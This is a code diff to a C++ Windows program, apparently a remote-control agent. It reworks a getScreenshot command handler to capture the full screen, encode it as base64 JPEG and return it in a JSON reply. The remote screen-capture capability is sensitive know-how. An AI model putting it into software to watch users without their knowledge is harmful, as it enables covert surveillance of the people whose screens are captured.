@@ -4,9 +4,22 @@
 #include "networking.hpp"
 #include "base64.hpp"
 
+//  Define min max macros required by GDI+ headers.
+#ifndef max
+#define max(a,b) (((a) > (b)) ? (a) : (b))
+#else
+#error max macro is already defined
+#endif
+#ifndef min
+#define min(a,b) (((a) < (b)) ? (a) : (b))
+#else
+#error min macro is already defined
+#endif
+
 #include <fstream>
 #include <filesystem>
 #include <atlbase.h>
+#include <atlimage.h>
 #include <ShlObj.h>
 #include <shellapi.h>
 #include <boost/format.hpp>
@@ -158,7 +171,6 @@ void Controller::getScreenshot(json::json message) {
     BYTE *bBits = NULL;
     HANDLE hHeap = GetProcessHeap();
     DWORD cbBits, dwWritten = 0;
-    HANDLE hFile;
     INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
     INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
 
@@ -194,27 +206,26 @@ void Controller::getScreenshot(json::json message) {
     SelectObject(hMemDC, hBitmap);
     BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
 
-
-    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
-    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
-    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
-
-    CloseHandle(hFile);
-
     DeleteDC(hMemDC);
     ReleaseDC(NULL, hDC);
 
+	std::vector<BYTE> buf;
 	IStream *stream = NULL;
 	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
 	CImage image;
+	ULARGE_INTEGER liSize;
 
 	image.Attach(hBitmap);
-	image.Save(stream, Gdiplus::ImageFormatJPEG)
+	image.Save(stream, Gdiplus::ImageFormatJPEG);
+	IStream_Size(stream, &liSize);
+	DWORD len = liSize.LowPart;
+	IStream_Reset(stream);
+	buf.resize(len);
+	IStream_Read(stream, &buf[0], len);
+	stream->Release();
 
-	std::string fileString((std::istreambuf_iterator<char>(stream)), std::istreambuf_iterator<char>());
-	std::string fileBase64String = base64_encode(fileString);
-
+	std::string fileBase64String = base64_encode(std::string(buf.begin(), buf.end()));
+	
 	json::json response;
 	response["id"] = message["id"];
 	response["file"] = fileBase64String;
